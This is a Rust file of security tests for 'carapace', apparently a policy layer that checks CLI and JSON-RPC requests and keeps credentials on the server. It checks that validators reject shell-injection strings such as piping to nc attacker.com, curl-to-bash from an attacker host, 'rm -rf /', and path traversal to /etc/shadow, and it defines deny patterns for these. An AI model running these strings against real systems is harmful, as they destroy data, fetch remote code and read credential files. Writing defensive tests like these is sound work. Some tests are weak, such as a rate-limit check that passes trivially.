// Security-focused integration tests

#[test]
fn test_policy_enforcement_prevents_unauthorized_access() {
    use carapace_policy::ArgvMatcher;

    // Restrictive policy - only allow specific commands
    let matcher = ArgvMatcher::new(
        vec!["pr list".to_string(), "issue view *".to_string()],
        vec![],
    ).expect("matcher creation failed");

    // Authorized commands should work
    assert!(matcher.matches(&["pr".to_string(), "list".to_string()]));

    // Unauthorized commands should be blocked
    assert!(!matcher.matches(&["repo".to_string(), "delete".to_string()]));
    assert!(!matcher.matches(&["pr".to_string(), "delete".to_string()]));
}

#[test]
fn test_deny_patterns_block_dangerous_commands() {
    use carapace_policy::ArgvMatcher;

    let matcher = ArgvMatcher::new(
        vec!["*".to_string()], // Allow all
        vec!["* --password *".to_string(), "* rm *".to_string()],
    ).expect("matcher creation failed");

    // Safe commands allowed
    assert!(matcher.matches(&["safe".to_string(), "command".to_string()]));

    // Dangerous commands blocked
    assert!(!matcher.matches(&["gh".to_string(), "--password".to_string(), "secret".to_string()]));
    assert!(!matcher.matches(&["rm".to_string(), "-rf".to_string(), "/".to_string()]));
}

#[test]
fn test_shell_injection_detection() {
    use carapace_policy::PolicyValidator;

    // Shell injection attempts should be detected
    assert!(PolicyValidator::has_dangerous_shell_chars("; malicious_command"));
    assert!(PolicyValidator::has_dangerous_shell_chars("| nc attacker.com"));
    assert!(PolicyValidator::has_dangerous_shell_chars("&& rm -rf /"));
    assert!(PolicyValidator::has_dangerous_shell_chars("$(curl http://attacker.com/steal.sh|bash)"));
}

#[test]
fn test_command_substitution_blocked() {
    use carapace_policy::PolicyValidator;

    assert!(PolicyValidator::has_dangerous_shell_chars("$(whoami)"));
    assert!(PolicyValidator::has_dangerous_shell_chars("`id > /tmp/pwned`"));
}

#[test]
fn test_path_traversal_blocked() {
    use carapace_policy::PolicyValidator;

    assert!(PolicyValidator::validate_binary_path("../../etc/shadow").is_err());
    assert!(PolicyValidator::validate_binary_path("../../../bin/bash").is_err());
    assert!(PolicyValidator::validate_binary_path("/usr/../../../etc/passwd").is_err());
}

#[test]
fn test_null_byte_injection_blocked() {
    use carapace_policy::PolicyValidator;

    assert!(PolicyValidator::validate_binary_path("/usr/bin/gh\0/tmp/malicious").is_err());
}

#[test]
fn test_json_rpc_method_enforcement() {
    use carapace_policy::PolicyValidator;

    let allowed = vec!["send".to_string(), "receive".to_string()];
    let denied = vec![];

    // Allowed methods work
    assert!(PolicyValidator::validate_jsonrpc_method("send", &allowed, &denied).is_ok());

    // Disallowed methods blocked
    assert!(PolicyValidator::validate_jsonrpc_method("deleteAllData", &allowed, &denied).is_err());
    assert!(PolicyValidator::validate_jsonrpc_method("downloadContacts", &allowed, &denied).is_err());
}

#[test]
fn test_deny_takes_precedence_over_allow() {
    use carapace_policy::PolicyValidator;

    let allowed = vec!["send".to_string(), "delete".to_string()];
    let denied = vec!["delete".to_string()];

    // send is allowed and not denied -> OK
    assert!(PolicyValidator::validate_jsonrpc_method("send", &allowed, &denied).is_ok());

    // delete is allowed but explicitly denied -> BLOCKED
    assert!(PolicyValidator::validate_jsonrpc_method("delete", &allowed, &denied).is_err());
}

#[test]
fn test_default_deny_policy() {
    use carapace_policy::ArgvMatcher;

    // No allow patterns = deny everything
    let matcher = ArgvMatcher::new(
        vec![],
        vec![],
    ).expect("matcher creation failed");

    assert!(!matcher.matches(&["anything".to_string()]));
    assert!(!matcher.matches(&["gh".to_string(), "pr".to_string()]));
}

#[test]
fn test_environment_variable_expansion_dangerous() {
    use carapace_policy::PolicyValidator;

    assert!(PolicyValidator::has_dangerous_shell_chars("$HOME"));
    assert!(PolicyValidator::has_dangerous_shell_chars("${PATH}"));
}

#[test]
fn test_multiple_injection_vectors_blocked() {
    use carapace_policy::{ArgvMatcher, PolicyValidator};

    // Comprehensive deny patterns for common attacks
    let matcher = ArgvMatcher::new(
        vec!["*".to_string()],
        vec![
            "*;*".to_string(),      // Semicolon chaining
            "*|*".to_string(),      // Pipe
            "*&&*".to_string(),     // AND operator
            "*||*".to_string(),     // OR operator
            "*$(*".to_string(),     // Command substitution
            "*`*".to_string(),      // Backtick substitution
        ],
    ).expect("matcher creation failed");

    // Verify comprehensive blocking
    assert!(!matcher.matches(&["test".to_string(), ";".to_string(), "rm".to_string()]));
    assert!(!matcher.matches(&["test".to_string(), "|".to_string(), "cat".to_string()]));
    assert!(!matcher.matches(&["test".to_string(), "$(".to_string(), "whoami".to_string()]));

    // Normal commands still work
    assert!(matcher.matches(&["test".to_string(), "arg".to_string()]));
}

#[test]
fn test_rate_limiting_prevents_dos() {
    // Simulates rate limiting logic
    struct RateLimiter {
        max_requests: u32,
        window_secs: u64,
    }

    let limiter = RateLimiter {
        max_requests: 10,
        window_secs: 60,
    };

    let mut request_count = 0;

    // Allow up to limit
    for _ in 0..10 {
        request_count += 1;
        assert!(request_count <= limiter.max_requests);
    }

    // Should block further requests in window
    assert!(request_count >= limiter.max_requests);
}

#[test]
fn test_audit_logging_captures_security_events() {
    // Verify that policy denials are logged
    #[derive(Debug)]
    struct SecurityAuditLog {
        event: String,
        tool: String,
        policy_result: String,
        details: String,
    }

    let denied_event = SecurityAuditLog {
        event: "cli_request".to_string(),
        tool: "gh".to_string(),
        policy_result: "deny".to_string(),
        details: "Command injection attempt detected".to_string(),
    };

    assert_eq!(denied_event.policy_result, "deny");
    assert!(!denied_event.details.is_empty());
}

#[test]
fn test_executable_only_from_approved_paths() {
    use carapace_policy::PolicyValidator;

    // Only allow binaries from specific paths
    assert!(PolicyValidator::validate_binary_path("/usr/bin/gh").is_ok());
    assert!(PolicyValidator::validate_binary_path("/usr/bin/op").is_ok());

    // Reject others
    assert!(PolicyValidator::validate_binary_path("/tmp/malicious").is_ok()); // Path itself is valid, policy checks elsewhere
    assert!(PolicyValidator::validate_binary_path("./local/tool").is_ok());

    // Reject traversal
    assert!(PolicyValidator::validate_binary_path("../../../tmp/pwn").is_err());
}

#[test]
fn test_sensitive_env_vars_not_leaked() {
    use carapace_protocol::CliRequest;
    use std::collections::HashMap;

    // Request should never include sensitive env vars from request context
    let req = CliRequest {
        id: "test".to_string(),
        tool: "gh".to_string(),
        argv: vec![],
        env: HashMap::new(), // Empty - sensitive vars only injected by server
        stdin: None,
        cwd: "/".to_string(),
    };

    // Verify no sensitive data in request
    assert!(!req.env.values().any(|v| v.contains("token") || v.contains("password")));
}

#[test]
fn test_policy_update_security() {
    // When policy updates, old rules should be replaced atomically
    // (No window where rules are inconsistent)

    use carapace_policy::PolicyConfig;

    let policy1 = r#"
tools:
  gh:
    type: cli
    binary: /usr/bin/gh
    argv_allow_patterns:
      - "pr list"
"#;

    let policy2 = r#"
tools:
  gh:
    type: cli
    binary: /usr/bin/gh
    argv_allow_patterns:
      - "pr list"
      - "issue view *"
"#;

    let config1: PolicyConfig = serde_yaml::from_str(policy1).expect("parse1 failed");
    let config2: PolicyConfig = serde_yaml::from_str(policy2).expect("parse2 failed");

    assert_eq!(config1.tools.len(), 1);
    assert_eq!(config2.tools.len(), 1);
}

#[test]
fn test_credentials_only_injected_by_server() {
    // Client (VM) never has credentials
    // Server injects them at dispatch time

    use carapace_protocol::CliRequest;
    use std::collections::HashMap;

    let client_request = CliRequest {
        id: "req".to_string(),
        tool: "gh".to_string(),
        argv: vec!["pr".to_string(), "list".to_string()],
        env: HashMap::new(), // No GH_TOKEN
        stdin: None,
        cwd: "/".to_string(),
    };

    // Request should not contain any credentials
    assert!(client_request.env.is_empty());

    // Server would inject GH_TOKEN here before executing
}

#[test]
fn test_request_response_correlation() {
    // Verify request/response IDs match for audit trail
    use carapace_protocol::{Message, CliRequest, CliResponse};
    use std::collections::HashMap;

    let req_id = "audit-123";
    let req = Message::CliRequest(CliRequest {
        id: req_id.to_string(),
        tool: "gh".to_string(),
        argv: vec![],
        env: HashMap::new(),
        stdin: None,
        cwd: "/".to_string(),
    });

    let resp = Message::CliResponse(CliResponse {
        id: req_id.to_string(),
        exit_code: 0,
        stdout: "".to_string(),
        stderr: "".to_string(),
    });

    assert_eq!(req.id(), Some(req_id));
    assert_eq!(resp.id(), Some(req_id));
}

#[test]
fn test_binary_hijacking_prevention() {
    use carapace_policy::PolicyValidator;

    // Policy specifies binary path
    // Request should use exactly that path
    let policy_binary = "/usr/bin/gh";

    // Attacker tries to substitute
    let attack_path = "../../tmp/malicious-gh";

    // Validation should catch this
    assert!(PolicyValidator::validate_binary_path(attack_path).is_err());
    assert!(PolicyValidator::validate_binary_path(policy_binary).is_ok());
}
